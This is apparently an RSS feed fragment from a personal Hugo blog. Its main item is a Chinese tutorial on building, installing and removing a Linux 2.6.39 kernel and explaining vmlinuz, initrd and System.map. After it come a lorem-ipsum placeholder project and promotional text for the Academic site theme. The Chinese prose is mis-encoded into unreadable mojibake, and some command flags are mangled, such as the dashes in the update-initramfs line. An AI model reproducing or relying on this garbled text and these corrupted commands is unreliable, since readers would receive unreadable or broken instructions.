&lt;p>æ¸çä¸äºä¸å¿è¦çæä»¶ï¼å¦æä½ å¨ä¸æ¬¡ç¼è¯çåºç¡ä¸ï¼å å»äºä¸äºéé¡¹ï¼å»ºè®®ä½ æ§è¡è¿ä¸æ­¥æä½ï¼å¦åï¼å°±æ²¡æå¿è¦äºã&lt;/p>
&lt;p>&lt;code>#make bzImage ç¼è¯åæ ¸&lt;/code>&lt;/p>
&lt;p>åæ ¸ç¼è¯æååï¼ä¼å¨æºç æ æ ¹ç®å½å³/usr/src/linux-2.6.39/arch/x86/boot/ç®å½ä¸­çæä¸ä¸ªæ°åæ ¸çæ åæä»¶bzImageã&lt;/p>
&lt;p>&lt;code>#make modules ç¼è¯æ¨¡å&lt;/code>&lt;/p>
&lt;p>ç¼è¯å¯å è½½æ¨¡åï¼å³åæ ¸éé¡¹ä¸­éæ©ä¸ºMçéé¡¹ï¼ï¼ä»¥ä¾¿å°æ¥ä½¿ç¨insmodå½ä»¤è¿è¡å è½½ãç¼è¯æ¶é´è·Méé¡¹çæ°éæå³ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-30-29.png" alt="">&lt;/p>
&lt;p>&lt;code>#make modules_install å®è£æ¨¡å&lt;/code>&lt;/p>
&lt;p>ç¼è¯æååï¼ç³»ç»ä¼å¨/lib/modulesç®å½ä¸çæä¸ä¸ª2.6.39å­ç®å½ï¼éé¢å­æ¾çæ°åæ ¸çææå¯å è½½æ¨¡å(å³å°ç¼è¯å¥½çmodulesæ·è´å°/lib/modulesä¸)ã&lt;/p>
&lt;p>&lt;code>#make install&lt;/code>&lt;/p>
&lt;p>å®è£åæ ¸,å³å¤å¶.configï¼vmlinuzï¼initrd.imgï¼System.mapæä»¶å°/bootç®å½ãæ´æ°grubã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-30-45.png" alt="">&lt;/p>
&lt;p>å½ç¶ï¼å¨è¿éæä»¬ä¹å¯ä»¥åå«æ·è´å°/bootç®å½ï¼&lt;/p>
&lt;ul>
&lt;li>å°çæçlinux-2.6.39/.config æ·è´å°è¦æ¿æ¢åæ ¸ç³»ç»ç/bootä¸ï¼å¹¶éå½åä¸ºconfig-2.6.39&lt;/li>
&lt;li>å°çæçlinux-2.6.39/arch/x86-64/boot/bzImageæ·è´å°è¦æ¿æ¢åæ ¸ç³»ç»ç/bootä¸ï¼å¹¶éå½åä¸ºvmlinuz-2.6.39ï¼æ³¨ï¼è¿ééç¹å«æ³¨ææ·è´åçæä»¶ååä¸ºvmlinuz-x.x.xï¼ã&lt;/li>
&lt;li>å°çæçlinux-2.6.39/System.mapæ·è´å°è¦æ¿æ¢åæ ¸ç³»ç»ç/bootä¸ï¼å¹¶éå½åä¸ºSystem.map-2.6.39&lt;/li>
&lt;li>å°make modules_installçæçç³»ç»ç®å½/lib/modules/linux-2.6.39æ·è´å°è¦æ¿æ¢åæ ¸ç³»ç»ç/lib/modulesä¸ã&lt;/li>
&lt;/ul>
&lt;p>&lt;code>#new-kernel-pkg --install --mkinitrd --depmod 2.6.33&lt;/code>(å°å¯å¨ä¿¡æ¯åå¥grub.confä¸­ï¼è¿éä¹å¯ä»¥å»/etc/ç¼è¾grub.confæä»¶ï¼å°å¯å¨ä¿¡æ¯æ¨¡ä»¿åæ¥å°åè¿å»ãæ³¨ï¼æçlinuxçæ¬æ¯ lilo.confæä»¶) (æµè¯äºä¸ä¸ç½ä¸æµä¼ çè¿æ¡æä»¤ï¼å¨æççµèä¸è¿æ¡å½ä»¤æ²¡æååº)&lt;/p>
&lt;pre>&lt;code class="language-bash">cd /lib/modules/2.6.39
update-initramfs âc âk 2.6.39
#çæ/boot/initrd.img-2.6.39æä»¶
&lt;/code>&lt;/pre>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-31-04.png" alt="">&lt;/p>
&lt;p>&lt;code>#update-grub&lt;/code>&lt;/p>
&lt;p>èªå¨æ¥æ¾æ°åæ ¸ï¼å¹¶æ·»å å°grupå¼å¯¼ä¸­&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-31-16.png" alt="">&lt;/p>
&lt;p>&lt;code>#shutdown -r now&lt;/code>&lt;/p>
&lt;p>ç«å³éå¯ï¼éå¯åæshiftä¼åç°å¤äºä¸ä¸ªlinux2.6.39å¯å¨é¡¹ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-31-32.png" alt="">&lt;/p>
&lt;p>è¡¥åï¼å¦ä½å¨å¯å¨çé¢ä¸­å å¥ä½ æ³è¦çä¸ªäººä¿¡æ¯&lt;/p>
&lt;p>æ¹æ³æè®¸å¤ï¼å¨è¿éä»ç»ä¸ä¸ªæ¹æ³ï¼&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Ubuntuçç»éåæ¬¢è¿ä¿¡æ¯æ§å¶/etc/issueå/etc/motd&lt;br>
å¶ä¸­/etc/issueä¸/etc/motdåºå«å¨äºï¼å½ä¸ä¸ªç½ç»ç¨æ·æéè¿ä¸²å£ç»å½ç³»ç» ä¸æ¶,/etc/issueçæä»¶åå®¹æ¾ç¤ºå¨loginæç¤ºç¬¦ä¹å,è/etc/motdåå®¹æ¾ç¤ºå¨ç¨æ·æåç»å½ç³»ç»ä¹åãä¿®æ¹è¿ä¸¤ä¸ªæä»¶é½å¯ä»¥è¾¾å°å å¥ä¸ªäººä¿¡æ¯çææã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¿®æ¹/boot/grub/grub.cfgæä»¶æ¥æ¹å¨æä»¬çå¼å¯¼é¡¹çåå­æ¥å®ææ¾ç¤ºä¸ªäººä¿¡æ¯ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¨ç¼è¯ä¹åå å¥ä¸ªäººä¿¡æ¯ï¼å°ä¿¡æ¯ç¼è¯è¿åæ ¸ï¼å¯¹/usr/src/linux-3.6/init.cæä»¶è¿è¡ä¿®æ¹ï¼å¨æåä¸ä¸ªå½æ°ä¸­ï¼å å¥printkï¼&amp;quot;***&amp;quot;ï¼æå°æ³è¦çä¿¡æ¯ï¼å¨è¿éè¦æ³¨ææå°çä¼åçº§ï¼å¿é¡»è®¾ç½®è¶è¿ä¸å®çä¼åçº§æ¹å¯å¨æ§å¶å°æå°åºæ³è¦çä¿¡æ¯ï¼å¯åèç¸å³printkå½æ°çä»ç»ï¼ã&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>å¸è½½åæ ¸&lt;/strong>&lt;/p>
&lt;p>é¦åæä»¬éè¦æ¥çä¸ä¸å½åä½¿ç¨çæ¯åªä¸ªåæ ¸ï¼&lt;/p>
&lt;pre>&lt;code class="language-bash">uname -r
&lt;/code>&lt;/pre>
&lt;p>è¯¥å½ä»¤ä¼åè¯ä½ å½åä½¿ç¨çåæ ¸çæ¬ï¼å¨ç»å½æ¶åï¼ä¸è½å¸è½½å½åçåæ ¸ï¼ä»¥åé ææ æ³å¯å¨çæ²å§~~&lt;br>
æ¥ä¸æ¥ï¼å¦æä½ æ¯èªå·±**å¨æç¼è¯**çåæ ¸çè¯ï¼è¯·å é¤ä»¥ä¸æä»¶åæä»¶å¤¹&lt;/p>
&lt;ol>
&lt;li>å é¤æ/lib/modules/ç®å½ä¸è¿æ¶çåæ ¸åºæä»¶&lt;/li>
&lt;li>å é¤æ/usr/src/kernels/ç®å½ä¸è¿æ¶çåæ ¸æºä»£ç &lt;/li>
&lt;li>å é¤æ/bootç®å½ä¸å¯å¨çæ ¸å¿æ¡£æ¡ä»¥ååæ ¸æ å&lt;/li>
&lt;li>æ´æ¹/boot/grub/menu.lstï¼å é¤æä¸ç¨çå¯å¨åè¡¨&lt;/li>
&lt;/ol>
&lt;p>å¨è¿éå°±åªæ¥åèªå·±å¨æç¼è¯çåæ ¸å¦ä½å¸è½½äºï¼å¦ææ¯å®è£åå®è£çåæ ¸ï¼ç¾åº¦æ¥è¯¢ç¸å³æä»¤å³å¯å¸è½½ï¼å½ç¶ï¼èªå·±æå¨å¸è½½ä¹æ¯å¯ä»¥çã&lt;/p>
&lt;h1 id="éè¦linuxåæ ¸æä»¶åæ">éè¦Linuxåæ ¸æä»¶åæ&lt;/h1>
&lt;p>&lt;code>.config&lt;/code>&lt;/p>
&lt;p>ä½¿ç¨make menuconfig çæçåæ ¸éç½®æä»¶ï¼å³å®å°åæ ¸çåä¸ªåè½ç³»ç»ç¼è¯è¿åæ ¸è¿æ¯ç¼è¯ä¸ºæ¨¡åè¿æ¯ä¸ç¼è¯ã&lt;/p>
&lt;p>&lt;code>vmlinuzåvmlinux&lt;/code>&lt;/p>
&lt;p>vmlinuzæ¯å¯å¼å¯¼çãåç¼©çåæ ¸ï¼âvmâä»£è¡¨âVirtual MemoryâãLinux æ¯æèæåå­ï¼ä¸åèçæä½ç³»ç»æ¯å¦DOSæ640KBåå­çéå¶ï¼Linuxè½å¤ä½¿ç¨ç¡¬çç©ºé´ä½ä¸ºèæåå­ï¼å æ­¤å¾åâvmâãvmlinuzæ¯å¯æ§è¡çLinuxåæ ¸ï¼ä½äº/boot/vmlinuz&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-32-24.png" alt="">&lt;/p>
&lt;p>vmlinuzçå»ºç«æä¸¤ç§æ¹å¼ï¼&lt;/p>
&lt;ol>
&lt;li>
&lt;p>ç¼è¯åæ ¸æ¶éè¿âmake zImageâåå»ºï¼ç¶åéè¿ï¼âcp /usr/src/linux-2.4/arch/i386/linux/boot/zImage /boot/vmlinuzâäº§çzImageéç¨äºå°åæ ¸çæåµï¼å®çå­å¨æ¯ä¸ºäºååçå¼å®¹æ§ï¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åæ ¸ç¼è¯æ¶éè¿å½ä»¤make bzImageåå»ºï¼bzImageæ¯åç¼©çåæ ¸æ åï¼éè¦æ³¨æï¼bzImageä¸æ¯ç¨bzip2åç¼©çï¼bzImageä¸­çbzå®¹æå¼èµ·è¯¯è§£ï¼bzè¡¨ç¤ºâbig zImageâï¼bzImageä¸­çbæ¯âbigâææã zImageï¼vmlinuzï¼åbzImageï¼vmlinuzï¼é½æ¯ç¨gzipåç¼©çãå®ä»¬ä¸ä»æ¯ä¸ä¸ªåç¼©æä»¶ï¼èä¸å¨è¿ä¸¤ä¸ªæä»¶çå¼å¤´é¨åååµægzipè§£åç¼©ä»£ç ï¼æä»¥ä½ ä¸è½ç¨gunzip æ gzip âdcè§£åvmlinuzãåæ ¸æä»¶ä¸­åå«ä¸ä¸ªå¾®åçgzipç¨äºè§£åç¼©åæ ¸å¹¶å¼å¯¼å®ãä¸¤èçä¸åä¹å¤å¨äºï¼èçzImageè§£åç¼©åæ ¸å°ä½ç«¯åå­ï¼ç¬¬ä¸ä¸ª640Kï¼ï¼bzImageè§£åç¼©åæ ¸å°é«ç«¯åå­ï¼1Mä»¥ä¸ï¼ãå¦æåæ ¸æ¯è¾å°ï¼é£ä¹å¯ä»¥éç¨zImage æbzImageä¹ä¸ï¼ä¸¤ç§æ¹å¼å¼å¯¼çç³»ç»è¿è¡æ¶æ¯ç¸åçãå¤§çåæ ¸éç¨bzImageï¼ä¸è½éç¨zImageã&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>vmlinuxæ¯æªåç¼©çåæ ¸ï¼vmlinuzæ¯vmlinuxçåç¼©æä»¶ã&lt;/p>
&lt;p>&lt;code>initrd.img&lt;/code>&lt;/p>
&lt;p>initrdæ¯âinitial ramdiskâçç®åãinitrdä¸è¬è¢«ç¨æ¥ä¸´æ¶çå¼å¯¼ç¡¬ä»¶å°å®éåæ ¸vmlinuzè½å¤æ¥ç®¡å¹¶ç»§ç»­å¼å¯¼çç¶æãæ¯å¦initrd- 2.4.7-10.imgä¸»è¦æ¯ç¨äºå è½½ext3ç­æä»¶ç³»ç»åscsiè®¾å¤çé©±å¨ãå¦æä½ ä½¿ç¨çæ¯scsiç¡¬çï¼èåæ ¸vmlinuzä¸­å¹¶æ²¡æè¿ä¸ª scsiç¡¬ä»¶çé©±å¨ï¼é£ä¹å¨è£å¥scsiæ¨¡åä¹åï¼åæ ¸ä¸è½å è½½æ ¹æä»¶ç³»ç»ï¼ä½scsiæ¨¡åå­å¨å¨æ ¹æä»¶ç³»ç»ç/lib/modulesä¸ãä¸ºäºè§£å³è¿ä¸ªé®é¢ï¼å¯ä»¥å¼å¯¼ä¸ä¸ªè½å¤è¯»å®éåæ ¸çinitrdåæ ¸å¹¶ç¨initrdä¿®æ­£scsiå¼å¯¼é®é¢ï¼initrd-2.2.39.imgæ¯ç¨gzipåç¼©çæä»¶ãinitrdæ è±¡æä»¶æ¯ä½¿ç¨mkinitrdåå»ºçï¼mkinitrdå®ç¨ç¨åºè½å¤åå»ºinitrdæ è±¡æä»¶ï¼è¿ä¸ªå½ä»¤æ¯RedHatä¸æçï¼å¶å®Linuxåè¡çæè®¸æç¸åºçå½ä»¤ãè¿æ¯ä¸ªå¾æ¹ä¾¿çå®ç¨ç¨åºãå·ä½æåµè¯·çå¸®å©ï¼man mkinitrd&lt;/p>
&lt;p>&lt;code>System.map&lt;/code>&lt;/p>
&lt;p>System.mapæ¯ä¸ä¸ªç¹å®åæ ¸çåæ ¸ç¬¦å·è¡¨ï¼ç±ânm vmlinuxâäº§çå¹¶ä¸ä¸ç¸å³çç¬¦å·è¢«æ»¤åºã&lt;/p>
&lt;p>&lt;code>å ä¸ªéè¦çåæ ¸æä»¶åæ&lt;/code>&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-33-08.png" alt="">&lt;/p>
&lt;p>archå­ç®å½åæ¬äºææåä½ç³»ç»æç¸å³çæ ¸å¿ä»£ç ãå®çæ¯ä¸ä¸ªå­ç®å½é½ä»£è¡¨ä¸ç§æ¯æçä½ç³»ç»æï¼ä¾å¦i386å°±æ¯å³äºintel cpuåä¸ä¹ç¸å¼å®¹ä½ç³»ç»æçå­ç®å½ãPCæºä¸è¬é½åºäºæ­¤ç®å½ï¼&lt;/p>
&lt;p>includeå­ç®å½åæ¬ç¼è¯æ ¸å¿æéè¦çå¤§é¨åå¤´æä»¶ãä¸å¹³å°æ å³çå¤´æä»¶å¨include/linuxå­ç®å½ä¸ï¼ä¸intel cpuç¸å³çå¤´æä»¶å¨include/asm-i386å­ç®å½ä¸,èinclude/scsiç®å½åæ¯æå³scsiè®¾å¤çå¤´æä»¶ç®å½ï¼&lt;/p>
&lt;p>initå­ç®å½åå«æ ¸å¿çåå§åä»£ç (æ³¨ï¼ä¸æ¯ç³»ç»çå¼å¯¼ä»£ç )ï¼åå«çä¸¤ä¸ªæä»¶main.cåVersion.cï¼è¿æ¯ç ç©¶æ ¸å¿å¦ä½å·¥ä½çä¸ä¸ªéå¸¸å¥½çèµ·ç¹ã&lt;/p>
&lt;p>Mmå­ç®å½åæ¬ææç¬ç«äºcpuä½ç³»ç»æçåå­ç®¡çä»£ç ï¼å¦é¡µå¼å­å¨ç®¡çåå­çåéåéæ¾ç­ï¼èåä½ç³»ç»æç¸å³çåå­ç®¡çä»£ç åä½äºarch/*/mm/ï¼ä¾å¦arch/i386/mm/Fault.c&lt;/p>
&lt;p>Kernelå­ç®å½åæ¬ä¸»è¦çæ ¸å¿ä»£ç ï¼æ­¤ç®å½ä¸çæä»¶å®ç°äºå¤§å¤æ°linuxç³»ç»çåæ ¸å½æ°ï¼å¶ä¸­æéè¦çæä»¶å½å±sched.cï¼åæ ·ï¼åä½ç³»ç»æç¸å³çä»£ç å¨arch/*/kernelä¸­ï¼&lt;/p>
&lt;p>Driverså­ç®å½æ¾ç½®ç³»ç»ææçè®¾å¤é©±å¨ç¨åºï¼æ¯ç§é©±å¨ç¨åºååå ç¨ä¸ä¸ªå­ç®å½ï¼å¦ï¼/blockä¸ä¸ºåè®¾å¤é©±å¨ç¨åºï¼æ¯å¦ideï¼ide.cï¼ãå¦æä½ å¸ææ¥çææå¯è½åå«æä»¶ç³»ç»çè®¾å¤æ¯å¦ä½åå§åçï¼ä½ å¯ä»¥çdrivers/block/genhd.cä¸­çdevice_setup()ãå®ä¸ä»åå§åç¡¬çï¼ä¹åå§åç½ç»ï¼å ä¸ºå®è£nfsæä»¶ç³»ç»çæ¶åéè¦ç½ç»ï¼&lt;/p>
&lt;p>å¶ä»å­ç®å½ï¼&lt;/p>
&lt;p>Libæ¾ç½®æ ¸å¿çåºä»£ç ï¼Net,æ ¸å¿ä¸ç½ç»ç¸å³çä»£ç ï¼Ipc,è¿ä¸ªç®å½åå«æ ¸å¿çè¿ç¨é´éè®¯çä»£ç ï¼&lt;/p>
&lt;p>Fs,ææçæä»¶ç³»ç»ä»£ç ååç§ç±»åçæä»¶æä½ä»£ç ï¼å®çæ¯ä¸ä¸ªå­ç®å½æ¯æä¸ä¸ªæä»¶ç³»ç»ï¼ä¾å¦fatåext2ï¼Scripts,æ­¤ç®å½åå«ç¨äºéç½®æ ¸å¿çèæ¬æä»¶ç­ãä¸è¬ï¼å¨æ¯ä¸ªç®å½ä¸ï¼é½æä¸ä¸ª.dependæä»¶åä¸ä¸ªMakefileæä»¶ï¼è¿ä¸¤ä¸ªæä»¶é½æ¯ç¼è¯æ¶ä½¿ç¨çè¾å©æä»¶ï¼ä»ç»éè¯»è¿ä¸¤ä¸ªæä»¶å¯¹å¼æ¸åä¸ªæä»¶è¿é´çèç³»åä¾æå³ç³»å¾æå¸®å©ï¼èä¸ï¼å¨æçç®å½ä¸è¿æReadmeæä»¶ï¼å®æ¯å¯¹è¯¥ç®å½ä¸çæä»¶çä¸äºè¯´æï¼åæ ·æå©äºæä»¬å¯¹åæ ¸æºç ççè§£ã&lt;/p>
&lt;h1 id="éå°çé®é¢">éå°çé®é¢&lt;/h1>
&lt;p>1.æºçé®é¢&lt;br>
å®è£å¿å¤è½¯ä»¶ç¼è¯å·¥å·:#apt-get installlibncurses5-dev build-essential kernel-package çæ¶åï¼æ æ³æ´æ°ï¼è¾å¥#sudo apt-get updateä¹æ æ³æ´æ°æ°æ®ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-33-19.png" alt="">&lt;/p>
&lt;p>å¨è¿éæ¯ç±äºubuntu10.10çæºåºç°é®é¢ï¼å¯¼è´æ æ³æ´æ°ãä¸è½½è½¯ä»¶ï¼è¿ééè¦éæ°ä¿®æ¹æºæä»¶ãå¤çå¦ä¸ï¼&lt;br>
&lt;a href="http://www.cnblogs.com/linuxcat/archive/2012/12/29/2839216.html">http://www.cnblogs.com/linuxcat/archive/2012/12/29/2839216.html&lt;/a>&lt;/p>
&lt;p>åèè¯¥ç½ç«åå®¹åï¼å°æºæ¢ä¸ºhttp://old-releases.ubuntu.com/ubuntu/å°åï¼å³å¯æ´æ°ãä¸è½½è½¯ä»¶ï¼å½ç¶ï¼å¶ä»å¯ç¨çæºå°åä¹æ¯å¯ä»¥çï¼ã&lt;/p>
&lt;p>2.æéé®é¢&lt;br>
å¨è¿ä¸ªåæ ¸çç¼è¯ãå®è£è¿ç¨ä¸­ï¼æ¶åå°çæä½é½æ¯éè¦rootæéæè½è¿è¡æä½çï¼å¦ææéä¸å¤ï¼åäº§çéè¯¯ãå¤çæ¹æ³ï¼ä½¿ç¨sudo(å¿é¡»ç»äºç»ç¨æ·ç³è¯·rootçæé)æèç´æ¥su rootåæ¢å°rootç¨æ·ä¸è¿è¡æ´ä¸ªè¿ç¨æä½ã&lt;/p></description></item><item><title>External Project</title><link>http://www.guozet.me/project/external-project/</link><pubDate>Wed, 27 Apr 2016 00:00:00 +0000</pubDate><guid>http://www.guozet.me/project/external-project/</guid><description/></item><item><title>Internal Project</title><link>http://www.guozet.me/project/internal-project/</link><pubDate>Wed, 27 Apr 2016 00:00:00 +0000</pubDate><guid>http://www.guozet.me/project/internal-project/</guid><description>&lt;p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.&lt;/p>
&lt;p>Nullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.&lt;/p>
&lt;p>Cras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.&lt;/p>
&lt;p>Suspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.&lt;/p>
&lt;p>Aliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.&lt;/p></description></item><item><title>Academic: the website builder for Hugo</title><link>http://www.guozet.me/post/getting-started/</link><pubDate>Wed, 20 Apr 2016 00:00:00 +0000</pubDate><guid>http://www.guozet.me/post/getting-started/</guid><description>&lt;p>&lt;strong>Create a free website with Academic using Markdown, Jupyter, or RStudio. Choose a beautiful color theme and build anything with the Page Builder - over 40 &lt;em>widgets&lt;/em>, &lt;em>themes&lt;/em>, and &lt;em>language packs&lt;/em> included!&lt;/strong>&lt;/p>
&lt;p>
&lt;a href="https://academic-demo.netlify.com/" target="_blank" rel="noopener">Check out the latest &lt;strong>demo&lt;/strong>&lt;/a> of what you&amp;rsquo;ll get in less than 10 minutes, or
&lt;a href="https://sourcethemes.com/academic/#expo" target="_blank" rel="noopener">view the &lt;strong>showcase&lt;/strong>&lt;/a> of personal, project, and business sites.&lt;/p>
&lt;ul>
&lt;li>ð
&lt;a href="#install">&lt;strong>Get Started&lt;/strong>&lt;/a>&lt;/li>
&lt;li>ð
&lt;a href="https://sourcethemes.com/academic/docs/" target="_blank" rel="noopener">View the &lt;strong>documentation&lt;/strong>&lt;/a>&lt;/li>
&lt;li>ð¬
&lt;a href="https://discourse.gohugo.io" target="_blank" rel="noopener">&lt;strong>Ask a question&lt;/strong> on the forum&lt;/a>&lt;/li>
&lt;li>ð¥
&lt;a href="https://spectrum.chat/academic" target="_blank" rel="noopener">Chat with the &lt;strong>community&lt;/strong>&lt;/a>&lt;/li>
&lt;li>ð¦ Twitter:
&lt;a href="https://twitter.com/source_themes" target="_blank" rel="noopener">@source_themes&lt;/a>
&lt;a href="https://twitter.com/GeorgeCushen" target="_blank" rel="noopener">@GeorgeCushen&lt;/a>
&lt;a href="https://twitter.com/search?q=%23MadeWithAcademic&amp;amp;src=typd" target="_blank" rel="noopener">#MadeWithAcademic&lt;/a>&lt;/li>
&lt;li>ð¡
&lt;a href="https://github.com/gcushen/hugo-academic/issues" target="_blank" rel="noopener">Request a &lt;strong>feature&lt;/strong> or report a &lt;strong>bug&lt;/strong>&lt;/a>&lt;/li>
&lt;li>â¬ï¸ &lt;strong>Updating?&lt;/strong> View the
&lt;a href="https://sourcethemes.com/academic/docs/update/" target="_blank" rel="noopener">Update Guide&lt;/a> and
&lt;a href="https://sourcethemes.com/academic/updates/" target="_blank" rel="noopener">Release Notes&lt;/a>&lt;/li>
&lt;li>â¤ï¸ &lt;strong>Support development&lt;/strong> of Academic:
&lt;ul>
&lt;li>âï¸
&lt;a href="https://paypal.me/cushen" target="_blank" rel="noopener">&lt;strong>Donate a coffee&lt;/strong>&lt;/a>&lt;/li>
&lt;li>ðµ
&lt;a href="https://www.patreon.com/cushen" target="_blank" rel="noopener">Become a backer on &lt;strong>Patreon&lt;/strong>&lt;/a>&lt;/li>
&lt;li>ð¼ï¸
&lt;a href="https://www.redbubble.com/people/neutreno/works/34387919-academic" target="_blank" rel="noopener">Decorate your laptop or journal with an Academic &lt;strong>sticker&lt;/strong>&lt;/a>&lt;/li>
&lt;li>ð
&lt;a href="https://academic.threadless.com/" target="_blank" rel="noopener">Wear the &lt;strong>T-shirt&lt;/strong>&lt;/a>&lt;/li>
&lt;li>ð©âð»
&lt;a href="https://sourcethemes.com/academic/docs/contribute/" target="_blank" rel="noopener">&lt;strong>Contribute&lt;/strong>&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;figure id="figure-academic-is-mobile-first-with-a-responsive-design-to-ensure-that-your-site-looks-stunning-on-every-device">
&lt;a data-fancybox="" href="https://raw.githubusercontent.com/gcushen/hugo-academic/master/academic.png" data-caption="Academic is mobile first with a responsive design to ensure that your site looks stunning on every device.">
&lt;img src="https://raw.githubusercontent.com/gcushen/hugo-academic/master/academic.png" alt="" >
&lt;/a>
&lt;figcaption>
Academic is mobile first with a responsive design to ensure that your site looks stunning on every device.
&lt;/figcaption>
&lt;/figure>
&lt;p>&lt;strong>Key features:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Page builder&lt;/strong> - Create &lt;em>anything&lt;/em> with
&lt;a href="https://sourcethemes.com/academic/docs/page-builder/" target="_blank" rel="noopener">&lt;strong>widgets&lt;/strong>&lt;/a> and
&lt;a href="https://sourcethemes.com/academic/docs/writing-markdown-latex/" target="_blank" rel="noopener">&lt;strong>elements&lt;/strong>&lt;/a>&lt;/li>
&lt;li>&lt;strong>Edit any type of content&lt;/strong> - Blog posts, publications, talks, slides, projects, and more!&lt;/li>
&lt;li>&lt;strong>Create content&lt;/strong> in
&lt;a href="https://sourcethemes.com/academic/docs/writing-markdown-latex/" target="_blank" rel="noopener">&lt;strong>Markdown&lt;/strong>&lt;/a>,
&lt;a href="https://sourcethemes.com/academic/docs/jupyter/" target="_blank" rel="noopener">&lt;strong>Jupyter&lt;/strong>&lt;/a>, or
&lt;a href="https://sourcethemes.com/academic/docs/install/#install-with-rstudio" target="_blank" rel="noopener">&lt;strong>RStudio&lt;/strong>&lt;/a>&lt;/li>
&lt;li>&lt;strong>Plugin System&lt;/strong> - Fully customizable
&lt;a href="https://sourcethemes.com/academic/themes/" target="_blank" rel="noopener">&lt;strong>color&lt;/strong> and &lt;strong>font themes&lt;/strong>&lt;/a>&lt;/li>
&lt;li>&lt;strong>Display Code and Math&lt;/strong> - Code highlighting and
&lt;a href="https://en.wikibooks.org/wiki/LaTeX/Mathematics" target="_blank" rel="noopener">LaTeX math&lt;/a> supported&lt;/li>
&lt;li>&lt;strong>Integrations&lt;/strong> -
&lt;a href="https://analytics.google.com" target="_blank" rel="noopener">Google Analytics&lt;/a>,
&lt;a href="https://disqus.com" target="_blank" rel="noopener">Disqus commenting&lt;/a>, Maps, Contact Forms, and more!&lt;/li>
&lt;li>&lt;strong>Beautiful Site&lt;/strong> - Simple and refreshing one page design&lt;/li>
&lt;li>&lt;strong>Industry-Leading SEO&lt;/strong> - Help get your website found on search engines and social media&lt;/li>
&lt;li>&lt;strong>Media Galleries&lt;/strong> - Display your images and videos with captions in a customizable gallery&lt;/li>
&lt;li>&lt;strong>Mobile Friendly&lt;/strong> - Look amazing on every screen with a mobile friendly version of your site&lt;/li>
&lt;li>&lt;strong>Multi-language&lt;/strong> - 15+ language packs including English, ä¸­æ, and PortuguÃªs&lt;/li>
&lt;li>&lt;strong>Multi-user&lt;/strong> - Each author gets their own profile page&lt;/li>
&lt;li>&lt;strong>Privacy Pack&lt;/strong> - Assists with GDPR&lt;/li>
